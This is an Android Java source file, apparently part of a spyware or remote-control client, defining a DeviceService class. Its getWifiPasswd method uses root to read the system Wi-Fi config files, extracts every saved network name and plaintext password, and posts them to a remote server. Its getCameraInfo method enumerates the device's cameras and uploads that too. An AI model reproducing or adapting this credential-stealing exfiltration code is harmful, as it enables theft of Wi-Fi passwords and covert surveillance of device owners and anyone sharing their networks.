package com.fs.fs.api;

import android.annotation.SuppressLint;
import android.hardware.Camera;
import android.util.SparseArray;

import com.fs.fs.api.network.ApiConfig;
import com.fs.fs.api.network.core.BaseResponse;
import com.fs.fs.api.network.core.HttpParams;
import com.fs.fs.api.network.core.OkHttpUtils;
import com.fs.fs.api.network.core.callback.HttpCallback;
import com.fs.fs.bean.WIFIInfo;
import com.fs.fs.utils.Constant;
import com.fs.fs.utils.LogUtils;
import com.fs.fs.utils.SharePreferencesUtils;
import com.fs.fs.utils.ShellUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import okhttp3.Headers;

/**
 * Created by wyx on 2017/1/7.
 */

public class DeviceService {
    /**
     * Need ROOT
     */
    public static void getWifiPasswd() {
        ShellUtils.ShellResult result = ShellUtils.execCmd("cat /data/misc/wifi/*.conf", true, true);
        if (result.errorMsg != null) {
            LogUtils.e(result.errorMsg);
            return;
        }
        Pattern network = Pattern.compile("network=\\{([^\\}]+)\\}", Pattern.DOTALL);
        Pattern ssid = Pattern.compile("ssid=\"([^\"]+)\"");
        Pattern psk = Pattern.compile("psk=\"([^\"]+)\"");

        Matcher matcher = network.matcher(result.successMsg);
        List<WIFIInfo> infos = new ArrayList<>();
        while (matcher.find()) {
            String wifi = matcher.group();
            Matcher ssidMatcher = ssid.matcher(wifi);

            if (ssidMatcher.find()) {
                WIFIInfo info = new WIFIInfo();
                info.SSID = ssidMatcher.group(1);
                Matcher pskMatcher = psk.matcher(wifi);

                if (pskMatcher.find()) {
                    info.psk = pskMatcher.group(1);
                }
                infos.add(info);
                LogUtils.d(info.toString());
            }
        }
        OkHttpUtils.post(ApiConfig.getWifi(), new HttpParams().addJson("wifi", infos), new HttpCallback(BaseResponse.class) {
            @Override
            public void onSuccess(BaseResponse httpResponse, Headers headers) {
            }

            @Override
            public void onError(String errorMsg) {

            }
        });
    }

    @SuppressLint("UseSparseArrays")
    public static SparseArray<Integer> getCameraInfo() {
        SparseArray<Integer> map = (SparseArray<Integer>) SharePreferencesUtils.getInstance().get(Constant.SHARE_KEYS.CAMERA, null);
        if (map == null) {
            map = new SparseArray<>();
            Camera.CameraInfo cameraInfo = new Camera.CameraInfo();
            int cameraCount = Camera.getNumberOfCameras();
            for (int index = 0; index < cameraCount; index++) {
                Camera.getCameraInfo(index, cameraInfo);
                if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_FRONT) {
                    map.append(index, Constant.CAMERA.FRONT);
                } else if (cameraInfo.facing == Camera.CameraInfo.CAMERA_FACING_BACK) {
                    map.append(index, Constant.CAMERA.BACK);
                }
            }
            SharePreferencesUtils.getInstance().put(Constant.SHARE_KEYS.CAMERA, map);
            OkHttpUtils.post(ApiConfig.getCamera(), new HttpParams().addJson("camera", map), new HttpCallback(BaseResponse.class) {
                @Override
                public void onSuccess(BaseResponse httpResponse, Headers headers) {
                }

                @Override
                public void onError(String errorMsg) {

                }
            });
        }
        return map;
    }
}
